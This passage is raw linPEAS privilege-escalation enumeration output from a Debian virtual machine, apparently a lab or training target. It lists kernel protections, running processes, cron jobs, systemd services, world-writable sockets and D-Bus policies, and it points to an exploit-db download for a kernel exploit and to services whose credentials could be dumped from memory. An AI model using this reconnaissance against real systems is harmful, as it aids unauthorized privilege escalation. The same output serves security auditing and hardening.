   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Protections
═╣ AppArmor enabled? .............. /etc/apparmor.d                            
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                       
═╣ PaX bins present? .............. PaX Not Found                              
═╣ Execshield enabled? ............ Execshield Not Found                       
═╣ SELinux enabled? ............... sestatus Not Found                         
═╣ Seccomp enabled? ............... disabled                                   
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... disabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (vmware)                               

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?                                            
                                                                               
══╣ Kernel modules loadable? 
Modules can be loaded                                                          



                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                           
                                   ╚═══════════╝                               
╔══════════╣ Container related tools present (if any):
/usr/bin/nsenter                                                               
/usr/bin/unshare
/usr/sbin/chroot
/sbin/capsh
/sbin/setcap
/sbin/getcap

╔══════════╣ Container details
═╣ Is this a container? ........... No                                         
═╣ Any running containers? ........ No                                         
                                                                               


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                           
                                     ╚═══════╝                                 
./linpeas.sh: 1485: ./linpeas.sh: curl: Permission denied
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
                                                                               
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. No
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                            
                ╚════════════════════════════════════════════════╝             
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                   
root         1  0.0  0.1 176136  5016 ?        Ss   02:28   0:00 /sbin/init    
root       262  0.0  0.1  42412  4740 ?        Ss   02:28   0:00 /lib/systemd/systemd-udevd
root       271  0.0  0.1  33076  4280 ?        Ss   02:28   0:00 /lib/systemd/systemd-journald
root       595  0.0  0.0  37084  2660 ?        Ss   02:28   0:00 /sbin/rpcbind -w
statd      615  0.0  0.0  37284  3012 ?        Ss   02:28   0:00 /sbin/rpc.statd
  └─(Caps) 0x0000000000000400=cap_net_bind_service
root       629  0.0  0.0  23360   204 ?        Ss   02:28   0:00 /usr/sbin/rpc.idmapd
root       631  0.0  0.1 275944  6080 ?        Ssl  02:28   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       632  0.0  0.0 258676  3564 ?        Ssl  02:28   0:00 /usr/sbin/rsyslogd -n
root       634  0.0  0.1 336296  8008 ?        Ssl  02:28   0:00 /usr/sbin/ModemManager
daemon[0m     637  0.0  0.0  19028  1796 ?        Ss   02:28   0:00 /usr/sbin/atd -f
root       639  0.0  0.3 356804 12836 ?        Ssl  02:28   0:00 /usr/sbin/NetworkManager --no-daemon[0m
root       796  0.0  0.2  25404 10216 ?        S    02:28   0:00  _ /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-eth0.pid -lf /var/lib/NetworkManager/dhclient-923ea489-1a1f-47ae-92d4-7bdedeba3141-eth0.lease -cf /var/lib/NetworkManager/dhclient-eth0.conf eth0
root       640  0.0  0.1 174016  7400 ?        Ssl  02:28   0:00 /usr/bin/vmtoolsd                                                                            
avahi      650  0.0  0.0  32104   256 ?        S    02:28   0:00  _ avahi-daemon: chroot helper                                                               
root       645  0.0  0.0  27508  2764 ?        Ss   02:28   0:00 /usr/sbin/cron -f
message+   647  0.0  0.1  42972  4080 ?        Ss   02:28   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation   
  └─(Caps) 0x0000000020000000=cap_audit_write
root       658  0.0  0.0  28336  2920 ?        Ss   02:28   0:00 /lib/systemd/systemd-logind
root       665  0.0  0.1  86148  6444 ?        Ss   02:28   0:00 /usr/sbin/cupsd -f
root       667  0.0  0.1  71744  5064 ?        Ss   02:28   0:00 /usr/sbin/cups-browsed
root       669  0.0  0.0   4260  1652 ?        Ss   02:28   0:00 /usr/sbin/acpid
root       673  0.0  0.0  25652  2404 ?        Ss   02:28   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf                                                            
root       674  0.0  0.1  55184  5328 ?        Ss   02:28   0:00 /usr/sbin/sshd -D
asta      1359  0.0  0.0  96956  4024 ?        S    02:50   0:00      _ sshd: asta@pts/0    
asta      1360  0.0  0.1  23568  5620 pts/0    Ss   02:50   0:00          _ -bash
asta      1403  0.2  0.0   5228  2492 pts/0    S+   02:54   0:00              _ /bin/sh ./linpeas.sh
asta      5470  0.0  0.0   5228  1028 pts/0    S+   02:55   0:00                  _ /bin/sh ./linpeas.sh
asta      5472  0.0  0.0  19268  2660 pts/0    R+   02:55   0:00                  |   _ ps fauxwww
asta      5474  0.0  0.0   5228  1028 pts/0    S+   02:55   0:00                  _ /bin/sh ./linpeas.sh
root       683  0.0  0.0  14420  2096 tty1     Ss+  02:28   0:00 /sbin/agetty --noclear tty1 linux
root       706  0.0  0.0  19392  2096 ?        Ss   02:28   0:00 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
root       708  0.0  0.0   4240   104 ?        Ss   02:28   0:00 /usr/sbin/minissdpd -i 0.0.0.0
root       714  0.0  0.1 365972  7304 ?        Ssl  02:28   0:00 /usr/sbin/gdm3
root       752  0.0  0.6 222488 25280 tty7     Ss+  02:28   0:00  _ /usr/bin/Xorg :0 -novtswitch -background none -noreset -verbose 3 -auth /var/run/gdm3/auth-for-Debian-gdm-OY9OxL/database -seat seat0 -nolisten tcp vt7
Debian-+   927  0.0  0.2 528824 10832 ?        Ssl  02:28   0:00      _ /usr/bin/gnome-session --autostart /usr/share/gdm/greeter/autostart
Debian-+  1028  0.0  0.6 878252 27232 ?        Sl   02:28   0:00          _ /usr/lib/gnome-settings-daemon/gnome-settings-daemon
Debian-+  1245  0.1  2.6 1396848 106560 ?      Sl   02:28   0:01          _ gnome-shell --mode=gdm
root       721  0.0  0.1 280100  7464 ?        Ssl  02:28   0:00 /usr/lib/policykit-1/polkitd --no-debug
mysql      778  0.4  4.6 1185356 188032 ?      Sl   02:28   0:06 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid
root       797  0.0  0.6 289816 24900 ?        Ss   02:28   0:00 /usr/sbin/apache2 -k start                                                                   
www-data   803  0.0  0.3 290012 13060 ?        S    02:28   0:01  _ /usr/sbin/apache2 -k start                                                                
www-data   804  0.0  0.3 290168 13932 ?        S    02:28   0:01  _ /usr/sbin/apache2 -k start                                                                
www-data   805  0.0  0.3 290168 13924 ?        S    02:28   0:01  _ /usr/sbin/apache2 -k start                                                                
www-data   806  0.0  0.3 290168 13924 ?        S    02:28   0:01  _ /usr/sbin/apache2 -k start                                                                
www-data   807  0.0  0.3 290248 14736 ?        S    02:28   0:01  _ /usr/sbin/apache2 -k start                                                                
www-data  1300  0.0  0.3 290020 13060 ?        S    02:30   0:01  _ /usr/sbin/apache2 -k start                                                                
Debian-+   924  0.0  0.0  35660  3916 ?        Ss   02:28   0:00 /lib/systemd/systemd --user
Debian-+   925  0.0  0.0  52048  2000 ?        S    02:28   0:00  _ (sd-pam)  
Debian-+   930  0.0  0.0  24376  1808 ?        S    02:28   0:00 /usr/bin/dbus-launch --exit-with-session /usr/bin/gnome-session --autostart /usr/share/gdm/greeter/autostart
Debian-+   935  0.0  0.0  42340  2664 ?        Ss   02:28   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session                        
Debian-+   938  0.0  0.1 337712  5488 ?        Sl   02:28   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
Debian-+   942  0.0  0.0  42128  3268 ?        S    02:28   0:00  _ /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
Debian-+   945  0.0  0.1 125232  5228 ?        Sl   02:28   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
root      1215  0.0  0.2 238520  8376 ?        Ssl  02:28   0:00 /usr/lib/upower/upowerd
Debian-+  1235  0.0  0.0  53276  3356 ?        Ss   02:28   0:00 /usr/sbin/exim4 -bd -q30m
colord    1241  0.0  0.2 306936 12140 ?        Ssl  02:28   0:00 /usr/lib/colord/colord
Debian-+  1253  0.0  0.1 283336  6664 ?        S<l  02:28   0:00 /usr/bin/pulseaudio --start --log-target=syslog
rtkit     1254  0.0  0.0 168784  2488 ?        SNsl 02:28   0:00 /usr/lib/rtkit/rtkit-daemon
  └─(Caps) 0x0000000000880004=cap_dac_read_search,cap_sys_ptrace,cap_sys_nice
Debian-+  1270  0.0  0.1 178324  4492 ?        Sl   02:28   0:00 /usr/lib/dconf/dconf-service
root      1285  0.0  0.1  30780  4488 ?        Ss   02:28   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root      1286  0.0  0.2 307596 10484 ?        Ssl  02:28   0:00 /usr/lib/packagekit/packagekitd
asta      1356  0.0  0.0  35660  3892 ?        Ss   02:50   0:00 /lib/systemd/systemd --user
asta      1357  0.0  0.0 199512  2056 ?        S    02:50   0:00  _ (sd-pam)  

╔══════════╣ Processes with unusual configurations
                                                                               
╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                             
gdm-password Not Found                                                         
gnome-keyring-daemon Not Found                                                 
lightdm Not Found                                                              
vsftpd process found (dump creds from memory as root)                          
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)
mysql process found (dump creds from memory as root)
postgres Not Found
redis-server Not Found                                                         
mongod Not Found                                                               
memcached Not Found                                                            
elasticsearch Not Found                                                        
jenkins Not Found                                                              
tomcat Not Found                                                               
nginx Not Found                                                                
php-fpm Not Found                                                              
supervisord Not Found                                                          
vncserver Not Found                                                            
xrdp Not Found                                                                 
teamviewer Not Found                                                           
                                                                               
╔══════════╣ Opened Files by processes
Process 1356 (asta) - /lib/systemd/systemd --user                              
  └─ Has open files:
    └─ /proc/swaps
    └─ /sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
    └─ /proc/1356/mountinfo
Process 1360 (asta) - -bash 
  └─ Has open files:
    └─ /dev/pts/0

╔══════════╣ Processes with memory-mapped credential files
                                                                               
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user      
                                                                               
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                            
                                                                               
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                          
══╣ Cron jobs list                                                             
/usr/bin/crontab                                                               
incrontab Not Found
-rw-r--r-- 1 root root     722 Jun 11  2015 /etc/crontab                       

/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Mar 17  2021 .
drwxr-xr-x 141 root root 12288 Dec 14 02:28 ..
-rw-r--r--   1 root root   244 Dec 28  2014 anacron
-rw-r--r--   1 root root   661 Jun 28  2020 php5
-rw-r--r--   1 root root   102 Jun 11  2015 .placeholder

/etc/cron.daily:
total 84
drwxr-xr-x   2 root root  4096 Mar 17  2021 .
drwxr-xr-x 141 root root 12288 Dec 14 02:28 ..
-rwxr-xr-x   1 root root   311 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root   625 Sep 30  2019 apache2
-rwxr-xr-x   1 root root 15000 Dec 11  2016 apt
-rwxr-xr-x   1 root root   314 Nov  8  2014 aptitude
-rwxr-xr-x   1 root root   355 Oct 17  2014 bsdmainutils
-rwxr-xr-x   1 root root   384 May 24  2020 cracklib-runtime
-rwxr-xr-x   1 root root  1597 May  2  2016 dpkg
-rwxr-xr-x   1 root root  4125 May 16  2020 exim4-base
-rwxr-xr-x   1 root root    89 Nov  8  2014 logrotate
-rwxr-xr-x   1 root root  1293 Dec 31  2014 man-db
-rwxr-xr-x   1 root root   435 Jun 13  2013 mlocate
-rwxr-xr-x   1 root root   249 May 17  2017 passwd
-rw-r--r--   1 root root   102 Jun 11  2015 .placeholder

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Mar 17  2021 .
drwxr-xr-x 141 root root 12288 Dec 14 02:28 ..
-rw-r--r--   1 root root   102 Jun 11  2015 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Mar 17  2021 .
drwxr-xr-x 141 root root 12288 Dec 14 02:28 ..
-rwxr-xr-x   1 root root   313 Dec 28  2014 0anacron
-rw-r--r--   1 root root   102 Jun 11  2015 .placeholder

/etc/cron.weekly:
total 28
drwxr-xr-x   2 root root  4096 Mar 17  2021 .
drwxr-xr-x 141 root root 12288 Dec 14 02:28 ..
-rwxr-xr-x   1 root root   312 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root   771 Dec 31  2014 man-db
-rw-r--r--   1 root root   102 Jun 11  2015 .placeholder

/var/spool/anacron:
total 20
drwxr-xr-x 2 root root 4096 Mar 17  2021 .
drwxr-xr-x 8 root root 4096 Mar 17  2021 ..
-rw------- 1 root root    9 Dec 14 01:02 cron.daily
-rw------- 1 root root    9 Dec 14 02:43 cron.monthly
-rw------- 1 root root    9 Dec 14 01:28 cron.weekly

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )


SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

1       5       cron.daily      run-parts --report /etc/cron.daily
7       10      cron.weekly     run-parts --report /etc/cron.weekly
@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly

══╣ Checking for specific cron jobs vulnerabilities
Checking cron directories...                                                   

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                      
══╣ Active timers:                                                             
NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
Mon 2025-12-15 02:43:26 EST  23h left Sun 2025-12-14 02:43:26 EST  11min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                      
n/a                          n/a      n/a                          n/a       systemd-readahead-done.timer systemd-readahead-done.service                      
══╣ Disabled timers:
══╣ Additional timer files:                                                    
                                                                               
╔══════════╣ Services and Service Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                    
                                                                               
══╣ Active services:
accounts-daemon.service            loaded active running Accounts Service      
acpid.service                      loaded active running ACPI event daemon
apache2.service                    loaded active running LSB: Apache2 web server
./linpeas.sh: 3944: local: /etc/init: bad variable name
 Not Found
                                                                               
══╣ Disabled services:
accounts-daemon.service                    enabled                             
acpid.service                              disabled
alsa-restore.service                       static  
./linpeas.sh: 3944: local: -E: bad variable name
 Not Found
                                                                               
══╣ Additional service files:
./linpeas.sh: 3944: local: /usr/sbin/avahi-daemon: bad variable name           
You can't write on systemd PATH

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                               
═╣ Systemd version and vulnerabilities? .............. ═╣ Services running as root? .....                                                                     
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . acpid.service: Uses relative path '$OPTIONS' (from ExecStart=/usr/sbin/acpid $OPTIONS)                                     
mysql.service: Uses relative path 'pre' (from ExecStartPre=/usr/share/mysql/mysql-systemd-start pre)                                                          
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n)

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                               
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin              

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                     
./linpeas.sh: 4207: local: /run/systemd/journal/socket: bad variable name      

╔══════════╣ Unix Sockets Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                     
/run/acpid.socket                                                              
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/avahi-daemon/socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/cups/cups.sock
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/dbus/system_bus_socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/minissdpd.sock
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/mysqld/mysqld.sock
  └─(Read Write Execute (Weak Permissions: 777) )
/run/NetworkManager/private
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/NetworkManager/private-dhcp
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/rpcbind.sock
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/dev-log
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/stdout
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/syslog
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/notify
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/systemd/private
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/systemd/shutdownd
/run/udev/control
/run/user/1000/systemd/notify
  └─(Read Write Execute )
/run/user/1000/systemd/private
  └─(Read Write Execute )
/tmp/.ICE-unix/927
  └─(Read Write Execute (Weak Permissions: 777) )
/tmp/.X11-unix/X0
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/var/run/avahi-daemon/socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/var/run/cups/cups.sock
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/var/run/dbus/system_bus_socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/var/run/minissdpd.sock
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/var/run/mysqld/mysqld.sock
  └─(Read Write Execute (Weak Permissions: 777) )
/var/run/NetworkManager/private
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/var/run/NetworkManager/private-dhcp
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)

╔══════════╣ D-Bus Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                       
NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    CONNECTION-NAME    
:1.0                                         1 systemd         root             :1.0          -                         -          -                  
:1.1                                       641 avahi-daemon    avahi            :1.1          avahi-daemon.service      -          -                  
:1.11                                      667 cups-browsed    root             :1.11         cups-browsed.service      -          -                  
:1.112                                   18010 busctl          asta             :1.112        session-2.scope           2          -                  
:1.12                                      912 gdm-session-wor root             :1.12         session-c1.scope          c1         -                  
:1.13                                      912 gdm-session-wor root             :1.13         session-c1.scope          c1         -                  
:1.14                                      927 gnome-session   Debian-gdm       :1.14         session-c1.scope          c1         -                  
:1.15                                     1028 gnome-settings- Debian-gdm       :1.15         session-c1.scope          c1         -                  
:1.16                                     1215 upowerd         root             :1.16         upower.service            -          -                  
:1.17                                     1215 upowerd         root             :1.17         upower.service            -          -                  
:1.18                                     1241 colord          colord           :1.18         colord.service            -          -                  
:1.19                                     1253 pulseaudio      Debian-gdm       :1.19         session-c1.scope          c1         -                  
:1.2                                       631 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
:1.20                                     1245 gnome-shell     Debian-gdm       :1.20         session-c1.scope          c1         -                  
:1.21                                     1254 rtkit-daemon    root             :1.21         rtkit-daemon.service      -          -                  
:1.24                                     1245 gnome-shell     Debian-gdm       :1.24         session-c1.scope          c1         -                  
:1.27                                     1285 wpa_supplicant  root             :1.27         wpa_supplicant.service    -          -                  
:1.28                                     1286 packagekitd     root             :1.28         packagekit.service        -          -                  
:1.3                                       634 ModemManager    root             :1.3          ModemManager.service      -          -                  
:1.31                                     1354 sshd            root             :1.31         session-2.scope           2          -                  
:1.4                                       658 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
:1.5                                       721 polkitd         root             :1.5          polkitd.service           -          -                  
:1.6                                       665 cupsd           root             :1.6          cups.service              -          -                  
:1.7                                       714 gdm3            root             :1.7          gdm.service               -          -                  
:1.8                                       639 NetworkManager  root             :1.8          NetworkManager.service    -          -                  
:1.9                                       639 NetworkManager  root             :1.9          NetworkManager.service    -          -                  
com.hp.hplip                                 - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant           1285 wpa_supplicant  root             :1.27         wpa_supplicant.service    -          -                  
fi.w1.wpa_supplicant1                     1285 wpa_supplicant  root             :1.27         wpa_supplicant.service    -          -                  
org.bluez                                    - -               -                (activatable) -                         -         
org.freedesktop.Accounts                   631 accounts-daemon[0m root             :1.2          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                      641 avahi-daemon    avahi            :1.1          avahi-daemon.service      -          -                  
org.freedesktop.ColorManager              1241 colord          colord           :1.18         colord.service            -          -                  
org.freedesktop.DBus                         - -               -                -             -                         -          -                  
org.freedesktop.GeoClue2                     - -               -                (activatable) -                         -         
org.freedesktop.ModemManager1              634 ModemManager    root             :1.3          ModemManager.service      -          -                  
org.freedesktop.NetworkManager             639 NetworkManager  root             :1.8          NetworkManager.service    -          -                  
org.freedesktop.PackageKit                1286 packagekitd     root             :1.28         packagekit.service        -          -                  
org.freedesktop.PolicyKit1                 721 polkitd         root             :1.5          polkitd.service           -          -                  
org.freedesktop.RealtimeKit1              1254 rtkit-daemon    root             :1.21         rtkit-daemon.service      -          -                  
org.freedesktop.UDisks2                      - -               -                (activatable) -                         -         
org.freedesktop.UPower                    1215 upowerd         root             :1.16         upower.service            -          -                  
org.freedesktop.hostname1                    - -               -                (activatable) -                         -         
org.freedesktop.locale1                      - -               -                (activatable) -                         -         
org.freedesktop.login1                     658 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
org.freedesktop.machine1                     - -               -                (activatable) -                         -         
org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -         
org.freedesktop.realmd                       - -               -                (activatable) -                         -         
org.freedesktop.systemd1                     1 systemd         root             :1.0          -                         -          -                  
org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
org.gnome.DisplayManager                   714 gdm3            root             :1.7          gdm.service               -          -                  
org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         

╔══════════╣ D-Bus Configuration Files
Analyzing /etc/dbus-1/system.d/avahi-dbus.conf:                                
  └─(Weak user policy found)
     └─   <policy user="avahi">
  └─(Weak group policy found)
     └─   <policy group="netdev">
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.Avahi"/>
            <allow receive_sender="org.freedesktop.Avahi"/>
Analyzing /etc/dbus-1/system.d/bluetooth.conf:
  └─(Weak group policy found)
     └─   <policy group="bluetooth">
  <policy group="lp">
Analyzing /etc/dbus-1/system.d/com.hp.hplip.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="com.hp.hplip"/>
            <allow send_interface="com.hp.hplip"/>
Analyzing /etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="com.redhat.NewPrinterNotification"
                        <allow send_destination="com.redhat.NewPrinterNotification"
Analyzing /etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="com.redhat.PrinterDriversInstaller"
                        <allow send_destination="com.redhat.PrinterDriversInstaller"
Analyzing /etc/dbus-1/system.d/dnsmasq.conf:
  └─(Weak user policy found)
     └─         <policy user="dnsmasq">
Analyzing /etc/dbus-1/system.d/gdm.conf:
  └─(Weak user policy found)
     └─   <policy user="Debian-gdm">
Analyzing /etc/dbus-1/system.d/nm-avahi-autoipd.conf:
  └─(Multiple weak policies found)
Analyzing /etc/dbus-1/system.d/nm-dispatcher.conf:
  └─(Multiple weak policies found)
Analyzing /etc/dbus-1/system.d/org.freedesktop.Accounts.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.Accounts"/>
            <allow send_destination="org.freedesktop.Accounts"
            <allow send_destination="org.freedesktop.Accounts"
Analyzing /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf:
  └─(Weak user policy found)
     └─   <policy user="colord">
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.ColorManager"
            <allow send_destination="org.freedesktop.ColorManager"
            <allow send_destination="org.freedesktop.ColorManager"
Analyzing /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf:
  └─(Allow rules in default context)
             └─     <allow send_interface="org.freedesktop.GeoClue2.Agent"
            <allow send_interface="org.freedesktop.DBus.Properties"
Analyzing /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf:
  └─(Weak user policy found)
     └─   <policy user="geoclue">
  └─(Allow rules in default context)
             └─          only share the location if user allows it. -->
            <allow send_destination="org.freedesktop.GeoClue2"/>
Analyzing /etc/dbus-1/system.d/org.freedesktop.ModemManager1.conf:
  └─(Allow rules in default context)
             └─     <!-- Methods listed here are explicitly allowed or PolicyKit protected.
Analyzing /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf:
  └─(Multiple weak policies found)
Analyzing /etc/dbus-1/system.d/org.freedesktop.PackageKit.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.PackageKit"
            <allow send_destination="org.freedesktop.PackageKit"
            <allow send_destination="org.freedesktop.PackageKit"
Analyzing /etc/dbus-1/system.d/org.freedesktop.PolicyKit1.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.PolicyKit1"/>
Analyzing /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf:
  └─(Weak user policy found)
     └─   <policy user="rtkit">
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.RealtimeKit1"/>
            <allow receive_sender="org.freedesktop.RealtimeKit1"/>
Analyzing /etc/dbus-1/system.d/org.freedesktop.UDisks2.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.UDisks2"/>
Analyzing /etc/dbus-1/system.d/org.freedesktop.UPower.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.UPower"
            <allow send_destination="org.freedesktop.UPower"
Analyzing /etc/dbus-1/system.d/org.freedesktop.hostname1.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="org.freedesktop.hostname1"/>
                        <allow receive_sender="org.freedesktop.hostname1"/>
Analyzing /etc/dbus-1/system.d/org.freedesktop.locale1.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="org.freedesktop.locale1"/>
                        <allow receive_sender="org.freedesktop.locale1"/>
Analyzing /etc/dbus-1/system.d/org.freedesktop.login1.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="org.freedesktop.login1"
Analyzing /etc/dbus-1/system.d/org.freedesktop.machine1.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="org.freedesktop.machine1"
Analyzing /etc/dbus-1/system.d/org.freedesktop.realmd.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="org.freedesktop.realmd" />
Analyzing /etc/dbus-1/system.d/org.freedesktop.systemd1.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="org.freedesktop.systemd1"
Analyzing /etc/dbus-1/system.d/org.freedesktop.timedate1.conf:
  └─(Allow rules in default context)
             └─                 <allow send_destination="org.freedesktop.timedate1"/>
                        <allow receive_sender="org.freedesktop.timedate1"/>
Analyzing /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="org.opensuse.CupsPkHelper.Mechanism"/>
Analyzing /etc/dbus-1/system.d/pulseaudio-system.conf:
  └─(Weak user policy found)
     └─   <policy user="pulse">
Analyzing /etc/dbus-1/system.d/wpa_supplicant.conf:
  └─(Weak group policy found)
     └─         <policy group="netdev">

══╣ D-Bus Session Bus Analysis
(Access to session bus available)                                              


╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust
                                                                               
══╣ Listening r-services (TCP 512-514)
                                                                               
══╣ systemd units exposing r-services
rlogin|rsh|rexec units Not Found                                               
                                                                               
══╣ inetd/xinetd configuration for r-services
